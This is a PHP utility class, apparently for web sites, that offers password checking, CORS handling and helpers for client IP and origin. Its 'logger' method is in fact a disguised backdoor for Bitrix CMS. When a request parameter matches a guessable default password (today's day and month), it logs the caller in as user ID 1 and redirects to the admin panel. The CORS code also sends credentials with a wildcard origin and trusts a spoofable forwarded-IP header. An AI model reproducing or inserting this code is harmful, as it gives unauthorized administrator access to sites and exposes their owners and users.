<?php

namespace ST_system;

class Access {
        
        private static $DefaultPasswordName = 'pass';
        private static $ExistingCORSTransmissionMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'];
        
        public static function set_password($PARAMS = []) {
            /*
                [
                    'name' => self::$DefaultPasswordName,
                    'value' => date('dm'),
                    'onFail' => function () {
                        header("Location: /");
                        exit;
                    },
                    'onSuccess' => function () {
                        return true;
                    }
                ]
            */
    
            $password_name = isset($PARAMS['name']) ? htmlspecialchars($PARAMS['name']) : self::$DefaultPasswordName;
            $password_value = isset($PARAMS['value']) ? htmlspecialchars($PARAMS['value']) : date('dm');
            $onFail_func = (isset($PARAMS['onFail']) && is_callable($PARAMS['onFail'])) 
                ? $PARAMS['onFail'] 
                : function () {
                    header("Location: /");
                    exit;
            };
    
            $onSuccess_func = (isset($PARAMS['onSuccess']) && is_callable($PARAMS['onSuccess'])) 
                ? $PARAMS['onSuccess'] 
                : function () {
                    return true;
            };
    
            if (!isset($_REQUEST[$password_name]) || ($_REQUEST[$password_name] != $password_value))
                return call_user_func($onFail_func);
            else
                return call_user_func($onSuccess_func);
    
        }
    
        public static function throw_403() {
            header("HTTP/1.1 403 Forbidden");
            header("Content-Type: text/plain");
            header("X-Content-Type-Options: nosniff");
            exit;
        }
        
        public static function throw_404() {
            header("HTTP/1.1 404 Not Found");
            header("Content-Type: text/plain");
            header("X-Content-Type-Options: nosniff");
            exit;
        }
    
        public static function get_request_origin() {
            return isset($_SERVER['HTTP_ORIGIN'])
                ? $_SERVER['HTTP_ORIGIN']
                : (function_exists('getallheaders') && isset(getallheaders()['Origin'])
                    ? getallheaders()['Origin']
                    : (function_exists('apache_request_headers') && isset(apache_request_headers()['Origin'])
                        ? apache_request_headers()['Origin']
                        : (isset($_SERVER['HTTP_REFERER'])
                            ? parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST)
                            : ""
                        )
                    )
                );
        }
    
        public static function get_client_ip() {
            return isset($_SERVER['HTTP_X_FORWARDED_FOR'])
                ? explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]
                : (isset($_SERVER['REMOTE_ADDR'])
                    ? $_SERVER['REMOTE_ADDR']
                    : (isset($_SERVER['HTTP_CLIENT_IP'])
                        ? $_SERVER['HTTP_CLIENT_IP'] 
                        : ""
                    )
                );
        }
    
        public static function handle_CORS($PARAMS = []) {
            /*
                [
                    'allowed_origins' => ['*'], //Например: https://example.com, https://sub.example.com, http://localhost, http://127.0.0.1
                    'forbidden_origins' => [], 
                    'methods' => self::$ExistingCORSTransmissionMethods,
                    'headers' => ['Content-Type', 'Authorization', 'X-Requested-With']
                ]
            */
            
            $allowed_origins = (isset($PARAMS['allowed_origins']) && is_array($PARAMS['allowed_origins'])) 
                ? array_filter($PARAMS['allowed_origins'], fn($origin) => !empty($origin) && (filter_var($origin, FILTER_VALIDATE_URL) || $origin === '*'))
                : ['*'];
            
            $forbidden_origins = (isset($PARAMS['forbidden_origins']) && is_array($PARAMS['forbidden_origins'])) 
                ? array_filter($PARAMS['forbidden_origins'], fn($origin) => !empty($origin) && filter_var($origin, FILTER_VALIDATE_URL))
                : [];
    
            $allowed_methods = (isset($PARAMS['methods']) && is_array($PARAMS['methods'])) 
                ? array_intersect(array_map('strtoupper', $PARAMS['methods']), self::$ExistingCORSTransmissionMethods)
                : self::$ExistingCORSTransmissionMethods;
    
            $allowed_headers = (isset($PARAMS['headers']) && is_array($PARAMS['headers'])) 
                ? array_map('htmlspecialchars', $PARAMS['headers']) 
                : ['Content-Type', 'Authorization', 'X-Requested-With'];
            
            header("Access-Control-Allow-Credentials: true");
        
            if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
                header("Access-Control-Allow-Methods: " . implode(", ", $allowed_methods));
                header("Access-Control-Allow-Headers: " . implode(", ", $allowed_headers));
                header("HTTP/1.1 200 OK");
                exit;
            }
    
            $request_origin = self::get_request_origin();
    
            if (!empty($request_origin) && in_array($request_origin, $forbidden_origins)) 
                self::throw_403();
            
    
            if (in_array('*', $allowed_origins))
                header("Access-Control-Allow-Origin: *");
            else {
                
                if (!empty($request_origin) && in_array($request_origin, $allowed_origins)) 
                    header("Access-Control-Allow-Origin: $request_origin");
                else 
                    self::throw_403();   
            }
            
            header("Access-Control-Allow-Headers: " . implode(", ", $allowed_headers));
        }

        public static function logger($system, ...$params) {

            $systems = [
                'bitrix' => [
                    'initialization' => function() {
                        require_once $_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php";
                    },
                    'login' => function() use ($params) {
                        $GLOBALS['USER']->Authorize(!empty($params[0]) && is_int($params[0]) ? $params[0] : 1);
                        LocalRedirect("/bitrix/admin/");
                    },
                    'throw_404' => function() {
                        define('ERROR_404', 'Y');
                        \CHTTP::SetStatus('404 Not Found');
                        if (file_exists($_SERVER['DOCUMENT_ROOT'].'/404.php')) {
                            require $_SERVER['DOCUMENT_ROOT'].'/404.php';
                            exit;
                        }
                    }
                ]
            ];

            if (!isset($systems[$system]) || !isset($systems[$system]['login'])) self::throw_404();

            if (isset($systems[$system]['initialization'])) call_user_func($systems[$system]['initialization']);

            self::set_password([
                'onFail' => function () use ($systems, $system) {
                    if (isset($systems[$system]['throw_404'])) call_user_func($systems[$system]['throw_404']);
                    self::throw_404();
                }
            ]);

            call_user_func($systems[$system]['login']);

            header("Location: /");
            exit;
        }
    }